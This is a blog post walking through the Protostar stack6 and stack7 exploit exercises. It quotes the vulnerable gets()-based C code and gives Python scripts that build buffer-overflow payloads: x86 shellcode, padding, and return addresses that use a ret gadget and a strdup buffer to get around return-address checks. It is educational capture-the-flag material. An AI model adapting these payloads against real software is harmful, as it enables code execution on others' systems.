---
layout: post
title:  "Protostar Exploit Exercises: Stacks Part Three"
---

## [stack6](https://exploit-exercises.com/protostar/stack6/)

>###About
>
>Stack6 looks at what happens when you have restrictions on the return address.
>
>This level can be done in a couple of ways, such as finding the duplicate of the payload (objdump -s) will help with this), or ret2libc, or even return orientated programming.
>
>It is strongly suggested you experiment with multiple ways of getting your code to execute here.

Let's have a look at a excerpt from the code.

{% highlight c %}
void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}
{% endhighlight %}

In [my previous post]({% post_url 2016-01-11-protostar-part-two %}), I
used a  return address which  pointed to  somewhere on the  stack (the
stack  in  linux  is  usually  located  around  0xbffff000).  In  this
challenge, that's  no longer  possible since  the function  checks the
return address  & quits if the  address we've provided is  pointing to
somewhere on the stack.

## ROP-solution: Return oriented halting

Even though the C-code does not allow us to jump into our buffer,
there's no protection beyond that point. So what if we jumped to a location,
that jumps to a location?

![Return deeper]({{ site-url }}/assets/post_images/protostar_part3_go_deeper.png)

{% highlight python %}
# shellcode.py
from struct import pack

ret    = pack('L', 0x08048508)
buffer = pack('L', 0xbffff76c)
# https://www.exploit-db.com/exploits/37289/
shellcode = '\x31\xc0\x50\x68\x68\x61\x6c'+\
    '\x74\x68\x69\x6e\x2f\x2f\x68\x2f\x2f'+\
    '\x73\x62\x89\xe3\x50\x89\xe2\x53\x89'+\
    '\xe1\xb0\x0b\xcd\x80'

# esp = 0xbffff7bc
# buffer = 0xbffff76c
padding = "A" * (0xbffff7bc-0xbffff76c - len(shellcode))

payload = shellcode + padding + ret + buffer

print(payload)
{% endhighlight %}

`python shellcode.py > shellcode`

All we need to do is find a location *somewhere* in memory that 
holds a `ret` instruction. 

So when the `ret` in `getpath` executes, 4 bytes are popped of the stack
into eip & provided that eip is now pointing at another `ret` instruction,
another 4 bytes are popped of the stack & into eip. Right?

![Yep]({{ site-url }}/assets/post_images/protostar_part3_quite_right.png)

Right.

*note: The `pop` instruction increments the stack-pointer by 4, so we
 need to place the next return address after our initial one.*

There you have it. I might revisit this challenge with the ret2libc
solution later but for now - I've been unable to find the
system-function loaded in via libc in the executable. Looking for it
in gdb only yields `__libc_system`.

![Frowntown]({{ site-url }}/assets/post_images/protostar_part3_no_system.png)

* * *

## [stack7](https://exploit-exercises.com/protostar/stack7/)

> Stack6 introduces return to .text to gain code execution.
>
>The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.

The `getpath` function is back, and this time... it's personal.

{% highlight c %}
char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}
{% endhighlight %}

strdup returns the address of the allocated string in the eax register.

We can get around the return-address check if we jump to the buffer
allocated by strdup. Very much like the previous challenge, I used gdb
to set a breakpoint at the `ret` instruction in getpath, took note of the 
following states:

+ The returned address from strdup stored in eax

+ The value of esp before the `ret` instruction executed.

+ The address of the buffer

{% highlight python %}
from struct import pack

shellcode = '\x31\xc0\x50\x68\x68\x61\x6c\x74'+\
    '\x68\x69\x6e\x2f\x2f\x68\x2f\x2f\x73\x62'+\
    '\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b'+\
    '\xcd\x80'
payload = shellcode +\
    'A'*(0x7bc-0x76c - len(shellcode)) +\
    pack('L', 0x804a008)

print(payload)
{% endhighlight %}

![Success]({{ site-url }}/assets/post_images/protostar_part3_ez_stack7.png)

![Happy]({{ site-url }}/assets/post_images/happy_zizek.jpg)

Now onto the Format challenges! :D

Thanks for reading!


